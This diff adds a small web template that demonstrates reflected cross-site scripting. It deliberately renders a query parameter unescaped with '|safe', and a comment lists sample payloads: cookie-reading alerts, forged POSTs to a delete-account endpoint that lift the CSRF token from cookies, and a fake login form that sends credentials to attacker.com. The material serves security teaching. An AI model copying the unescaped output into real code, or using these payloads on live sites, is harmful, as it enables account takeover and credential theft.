@@ -1,0 +1,41 @@
+<h2>Reflected XSS Demo</h2>
+
+<form method="get">
+  <input name="q">
+  <button>Search</button>
+</form>
+
+<p>Result:</p>
+{{ q|safe }}   
+<!--  INTENTIONAL XSS |safe this allow you to escape this 
+?q=<script>alert('Reflected')</script> or more danguerous payloads
+<script>alert(document.cookie)</script>
+
+<script>
+fetch("/delete-account/", {
+  method: "POST",
+  headers: {
+    "X-CSRFToken": document.cookie.split("=")[1]
+  }
+})
+</script>
+
+<script>
+document.body.innerHTML = `
+  <h1>Session expired</h1>
+  <form action="https://attacker.com/login">
+    <input name="email">
+    <input name="password">
+  </form>
+`
+</script>
+
+<script>
+fetch("/xss-demo-action/", {
+  method: "POST",
+  headers: {
+    "X-CSRFToken": document.cookie.split("=")[1]
+  }
+})
+</script>
+-->
